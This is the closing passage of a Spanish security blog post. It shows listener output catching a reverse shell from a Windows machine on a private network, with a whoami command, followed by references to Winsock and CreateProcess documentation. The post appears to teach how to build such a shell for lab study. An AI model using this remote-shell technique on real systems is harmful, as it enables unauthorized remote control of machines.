</span><span class="z-text z-plain">Listening on 0.0.0.0 443
</span><span class="z-text z-plain">Connection received on 192.168.1.131 50366
</span><span class="z-text z-plain">Microsoft Windows [Versi�n 10.0.19045.6456]
</span><span class="z-text z-plain">(c) Microsoft Corporation. Todos los derechos reservados.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">C:\Users\dreamer\AppData\Local\Programs\Python\Python39-32&gt; whoami
</span><span class="z-text z-plain">desktop-jk4rmt8\dreamner
</span></code></pre>
<h2 id="referencias">Referencias<a class="zola-anchor" href="#referencias" aria-label="Anchor link for: referencias" style="visibility: hidden;"></a>
</h2>
<ul>
<li>https://learn.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail</li>
<li>https://learn.microsoft.com/es-es/windows/win32/api/winsock/nf-winsock-wsastartup</li>
<li>https://learn.microsoft.com/es-es/windows/win32/api/winsock2/nf-winsock2-wsaconnect</li>
<li>https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</li>
</ul>

      </article>

      
      

      
      
    </div>

    


<footer>
  <div class="left">
    <div class="copyright">
      © 0x7e9 Dreamer
      
    </div>
  </div>

  <div class="right">
    
    
      
    
    
    <a id="rss-btn" href="https://dreamer-r3.github.io/posts/feed.xml">RSS</a>
    
    

    
    
    
    <button id="theme-toggle" aria-label="theme switch">
      <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
</span>
      <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
</span>
    </button>
    
  </div>
</footer>




<dialog id="rss-mask">
  <div>
    <a href="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml">https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml</a>
    
    
    <button autofocus aria-label="copy" data-link="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" >
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>

    </button>
  </div>
</dialog>



  </main>
</div>

  
<script src="/js/lightense.min.js"></script>


  <script src="https://dreamer-r3.github.io/js/main.js"></script>
</body>

</html>
